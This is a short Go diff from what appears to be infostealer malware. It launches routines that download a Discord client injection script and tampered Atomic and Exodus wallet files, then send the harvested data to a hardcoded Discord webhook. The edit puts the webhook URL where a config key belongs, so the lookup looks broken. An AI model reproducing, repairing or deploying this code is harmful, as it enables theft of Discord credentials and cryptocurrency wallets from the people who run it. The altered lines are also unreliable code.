@@ -59,12 +59,12 @@ func main() {
 
 	go discordinjection.Run(
 		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
-		CONFIG["webhook"].(string),
+		CONFIG["https://discord.com/api/webhooks/1488616289764245544/TYxW3D9MDWo8vgVaE_0vAuRbUODTockm-g03Jv5--PaEElLZ8QA0gDxF8_XX9YcYjxVs"].(string),
 	)
 	go walletsinjection.Run(
 		"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
 		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
-		CONFIG["webhook"].(string),
+		CONFIG["https://discord.com/api/webhooks/1488616289764245544/TYxW3D9MDWo8vgVaE_0vAuRbUODTockm-g03Jv5--PaEElLZ8QA0gDxF8_XX9YcYjxVs"].(string),
 	)
 
 	actions := []func(string){
